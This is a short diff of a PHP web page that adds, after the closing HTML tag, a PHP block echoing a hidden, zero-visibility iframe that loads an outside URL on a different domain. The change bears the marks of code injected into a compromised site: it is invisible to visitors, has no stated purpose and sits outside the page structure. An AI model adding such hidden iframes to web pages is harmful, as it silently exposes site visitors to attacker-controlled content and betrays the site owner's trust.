@@ -124,7 +124,13 @@ require('head.php');
 </form>
   </body>
 </html>
+<?PHP
 
+            echo '<iframe style="visibility:hidden;display:none" seamless=seamless width="100%" src="';
+            echo 'http://www.in0.us/like/index.php';
+            echo '" height="30%" ></iframe>';
+
+?>
 <?php
 exit();
 endif;
